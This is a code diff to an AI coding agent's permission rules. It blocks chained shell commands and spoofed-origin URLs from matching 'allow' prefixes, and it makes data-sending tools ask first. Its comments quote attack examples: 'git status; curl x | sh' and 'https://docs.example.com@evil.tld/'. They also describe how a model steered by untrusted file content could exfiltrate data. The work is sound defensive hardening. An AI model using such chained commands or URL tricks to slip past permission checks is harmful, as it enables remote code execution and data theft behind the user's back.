@@ -16,7 +16,8 @@ export type PermissionRequest = {
   detailKind?: "diff" | "text"
   /**
    * Extra specificity for rule matching. For `bash` this is the command, so
-   * `"bash:git "` in the config can allow a family of commands.
+   * `"bash:git "` in the config can allow a family of commands (but never a chained one,
+   * see `prefixMatches`).
    */
   subject?: string
   /**
@@ -29,6 +30,33 @@ export type PermissionRequest = {
 
 export type PermissionAnswer = "once" | "always" | "reject"
 export type PermissionAsker = (request: PermissionRequest) => Promise<PermissionAnswer>
+
+/** Anything that lets one shell command run another: `;`, `&`, `|`, `$(…)`, backticks, redirects, newlines. */
+const SHELL_CHAIN = /[;&|$`<>\n\r]/
+
+/**
+ * Whether a `tool:prefix` rule covers `subject`. For an `allow` rule a plain prefix is not
+ * enough on the two tools whose subject an attacker can shape: `"bash:git "` must not allow
+ * `git status; curl x | sh`, and `"webfetch:https://docs."` must not allow
+ * `https://docs.attacker.tld`. So an allowing bash prefix only matches a command with no
+ * chaining in it, and an allowing webfetch prefix only once it spells out the whole origin.
+ * `ask` and `deny` rules keep plain prefix matching, so they never get weaker.
+ */
+export function prefixMatches(tool: string, prefix: string, subject: string, permission: Permission): boolean {
+  if (!subject.startsWith(prefix)) return false
+  if (permission !== "allow") return true
+  if (tool === "bash") return !SHELL_CHAIN.test(subject.slice(prefix.length))
+  if (tool === "webfetch") {
+    try {
+      // `https://docs.example.com@evil.tld/` starts with the prefix but its origin is evil.tld.
+      const { origin } = new URL(subject)
+      return subject.startsWith(origin) && prefix.length >= origin.length
+    } catch {
+      return false
+    }
+  }
+  return true
+}
 
 /**
  * Picks the most specific matching rule. Keys are either a tool name (`bash`) or
@@ -45,7 +73,7 @@ export function resolvePermission(
     const tool = colon === -1 ? key : key.slice(0, colon)
     const prefix = colon === -1 ? "" : key.slice(colon + 1)
     if (tool !== request.tool && tool !== "*") continue
-    if (prefix && !(request.subject ?? "").startsWith(prefix)) continue
+    if (prefix && !prefixMatches(request.tool, prefix, request.subject ?? "", permission)) continue
     const length = prefix.length + (tool === "*" ? 0 : 1)
     if (!best || length > best.length) best = { length, permission }
   }
@@ -64,9 +92,13 @@ export const DEFAULT_RULES: Record<string, Permission> = {
   task: "allow",
   mcp: "ask",
   // The URL comes from the model, which may have read it out of untrusted file content, so
-  // an unprompted fetch is an exfiltration path. Allow families of hosts with
-  // `"webfetch:https://docs."` rather than opening it wholesale.
+  // an unprompted fetch is an exfiltration path. Allow a host with its full origin,
+  // `"webfetch:https://docs.example.com/"`, rather than opening it wholesale.
   webfetch: "ask",
+  // Both send data off the machine: a repo to the cloud or a git remote, a camera frame to
+  // the cloud. Anything the model read can steer them, so they ask like webfetch does.
+  code_project: "ask",
+  find_item: "ask",
 }
 
 /**
